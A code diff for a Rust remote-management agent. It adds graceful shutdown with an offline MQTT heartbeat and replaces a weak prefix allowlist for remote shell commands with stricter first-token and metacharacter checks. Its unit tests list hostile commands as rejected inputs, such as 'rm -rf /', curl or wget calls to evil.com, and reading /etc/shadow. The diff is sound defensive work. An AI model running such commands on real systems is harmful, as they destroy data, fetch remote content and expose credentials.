@@ -120,7 +120,7 @@ impl Agent {
         Ok(())
     }
 
-    /// Start agent main loop
+    /// Start agent main loop with graceful shutdown on SIGTERM/SIGINT
     pub async fn run(&mut self) -> Result<()> {
         info!("Starting agent main loop...");
 
@@ -131,8 +131,18 @@ impl Agent {
         let mut registration_timer = interval(Duration::from_secs(300));
         let mut reconnect_rx = self.reconnect_rx.take();
 
+        // Graceful shutdown signal
+        let mut shutdown = std::pin::pin!(shutdown_signal());
+
         loop {
             tokio::select! {
+                _ = &mut shutdown => {
+                    info!("Shutdown signal received, stopping agent gracefully...");
+                    self.send_offline_heartbeat().await;
+                    info!("Agent stopped.");
+                    break Ok(());
+                }
+
                 _ = heartbeat_timer.tick() => {
                     if let Err(e) = self.send_heartbeat().await {
                         error!("Failed to send heartbeat: {}", e);
@@ -156,6 +166,7 @@ impl Agent {
                         }
                         None => {
                             warn!("Command channel closed");
+                            self.send_offline_heartbeat().await;
                             break Ok(());
                         }
                     }
@@ -174,6 +185,30 @@ impl Agent {
                     }
                 }
             }
+        }
+    }
+
+    /// Send a final heartbeat with status=offline before shutting down
+    async fn send_offline_heartbeat(&self) {
+        let heartbeat = HeartbeatMessage {
+            agent_id: self.system_info.agent_id.clone(),
+            status: "offline".to_string(),
+            system: match metrics::SystemMetrics::collect().await {
+                Ok(m) => m,
+                Err(_) => return,
+            },
+            processes: None,
+            services: None,
+            last_command: self.last_command.clone(),
+            timestamp: Utc::now(),
+        };
+
+        if let Err(e) = mqtt_client::publish_json(
+            &self.mqtt_client, mqtt_client::TOPIC_HEARTBEAT, &heartbeat
+        ).await {
+            warn!("Failed to send offline heartbeat: {}", e);
+        } else {
+            info!("Offline heartbeat sent");
         }
     }
 
@@ -385,18 +420,11 @@ impl Agent {
             }
         };
 
-        // Security: validate command against allowlist (prefix check)
-        let safe_commands = [
-            "dir", "ls", "whoami", "hostname", "date", "uptime", "ps", "tasklist",
-            "shutdown", "echo", "systemctl", "cat", "tail", "head", "pwd", "id",
-            "ipconfig", "ifconfig", "powershell", "get-process", "netstat", "ping",
-            "tracert", "nslookup",
-        ];
-        let is_safe = safe_commands.iter().any(|&safe_cmd| command.starts_with(safe_cmd));
-        if !is_safe {
+        // Security: validate command against allowlist
+        if let Err(reason) = validate_shell_command(command) {
             return ("error".to_string(), None, Some(ErrorInfo {
                 code: "UNSAFE_COMMAND".to_string(),
-                message: format!("Command not allowed: {}", command),
+                message: reason,
             }));
         }
 
@@ -524,9 +552,145 @@ impl Agent {
     }
 }
 
+/// Allowed commands for remote shell execution.
+/// Only the first token (binary name) is checked — shell chaining is blocked separately.
+const ALLOWED_COMMANDS: &[&str] = &[
+    "cat", "date", "df", "dir", "echo", "free", "head", "hostname",
+    "id", "ifconfig", "ip", "ipconfig", "ls", "netstat", "nslookup",
+    "ping", "ps", "pwd", "systemctl", "tail", "tasklist", "tracert",
+    "traceroute", "uname", "uptime", "wc", "who", "whoami",
+];
+
+/// Shell metacharacters that indicate command chaining or injection.
+const DANGEROUS_PATTERNS: &[&str] = &[
+    ";", "&&", "||", "|", "$(", "`", "<(", ">(", "\n", "\r",
+];
+
+/// Validate a shell command against the allowlist.
+/// Returns Ok(()) if safe, Err(reason) if blocked.
+fn validate_shell_command(command: &str) -> Result<(), String> {
+    let trimmed = command.trim();
+    if trimmed.is_empty() {
+        return Err("Empty command".to_string());
+    }
+
+    // Block shell chaining / injection metacharacters
+    for pattern in DANGEROUS_PATTERNS {
+        if trimmed.contains(pattern) {
+            return Err(format!(
+                "Command contains blocked operator '{}': {}",
+                pattern, trimmed
+            ));
+        }
+    }
+
+    // Block output redirection
+    if trimmed.contains('>') {
+        return Err(format!("Command contains output redirection: {}", trimmed));
+    }
+
+    // Extract the first token (binary name) and validate against allowlist
+    let first_token = trimmed
+        .split_whitespace()
+        .next()
+        .unwrap_or("");
+
+    // Strip path prefix (e.g. /usr/bin/ls -> ls)
+    let binary_name = first_token.rsplit('/').next().unwrap_or(first_token);
+    // Also strip Windows path prefix (e.g. C:\Windows\System32\hostname.exe -> hostname.exe -> hostname)
+    let binary_name = binary_name.rsplit('\\').next().unwrap_or(binary_name);
+    let binary_name = binary_name.strip_suffix(".exe").unwrap_or(binary_name);
+
+    if !ALLOWED_COMMANDS.contains(&binary_name) {
+        return Err(format!("Command '{}' not in allowlist", binary_name));
+    }
+
+    Ok(())
+}
+
 /// Clean ANSI escape codes and control characters from command output
 fn clean_output(s: &str) -> String {
     s.chars()
         .filter(|c| c.is_ascii_graphic() || *c == ' ' || *c == '\n' || *c == '\r' || *c == '\t')
         .collect()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_allowed_command_passes() {
+        assert!(validate_shell_command("ls -la").is_ok());
+        assert!(validate_shell_command("whoami").is_ok());
+        assert!(validate_shell_command("ping 8.8.8.8").is_ok());
+        assert!(validate_shell_command("df -h").is_ok());
+        assert!(validate_shell_command("systemctl status nginx").is_ok());
+    }
+
+    #[test]
+    fn test_blocked_command_rejected() {
+        assert!(validate_shell_command("rm -rf /").is_err());
+        assert!(validate_shell_command("curl http://evil.com").is_err());
+        assert!(validate_shell_command("wget http://evil.com").is_err());
+        assert!(validate_shell_command("powershell -Command Get-Process").is_err());
+        assert!(validate_shell_command("bash -c 'echo pwned'").is_err());
+    }
+
+    #[test]
+    fn test_chaining_blocked() {
+        assert!(validate_shell_command("ls; rm -rf /").is_err());
+        assert!(validate_shell_command("ls && cat /etc/shadow").is_err());
+        assert!(validate_shell_command("ls || wget evil.com").is_err());
+        assert!(validate_shell_command("ls | xargs rm").is_err());
+    }
+
+    #[test]
+    fn test_injection_blocked() {
+        assert!(validate_shell_command("echo $(whoami)").is_err());
+        assert!(validate_shell_command("echo `id`").is_err());
+        assert!(validate_shell_command("ls > /tmp/output").is_err());
+    }
+
+    #[test]
+    fn test_path_prefix_stripped() {
+        assert!(validate_shell_command("/usr/bin/ls -la").is_ok());
+        assert!(validate_shell_command("/bin/cat /etc/hostname").is_ok());
+    }
+
+    #[test]
+    fn test_empty_command() {
+        assert!(validate_shell_command("").is_err());
+        assert!(validate_shell_command("   ").is_err());
+    }
+
+    #[test]
+    fn test_clean_output() {
+        // clean_output strips non-printable control chars (like ESC \x1b)
+        // but keeps ASCII graphic chars like [, 3, 1, m
+        assert_eq!(clean_output("Hello\x1b World"), "Hello World");
+        assert_eq!(clean_output("line1\nline2"), "line1\nline2");
+        assert_eq!(clean_output("ok\x00hidden"), "okhidden");
+    }
+}
+
+/// Wait for a shutdown signal (SIGTERM or SIGINT on Unix, Ctrl+C on Windows)
+async fn shutdown_signal() {
+    #[cfg(unix)]
+    {
+        use tokio::signal::unix::{signal, SignalKind};
+        let mut sigterm = signal(SignalKind::terminate())
+            .expect("failed to register SIGTERM handler");
+        let mut sigint = signal(SignalKind::interrupt())
+            .expect("failed to register SIGINT handler");
+        tokio::select! {
+            _ = sigterm.recv() => info!("Received SIGTERM"),
+            _ = sigint.recv() => info!("Received SIGINT"),
+        }
+    }
+    #[cfg(not(unix))]
+    {
+        tokio::signal::ctrl_c().await.expect("failed to register Ctrl+C handler");
+        info!("Received Ctrl+C");
+    }
 }
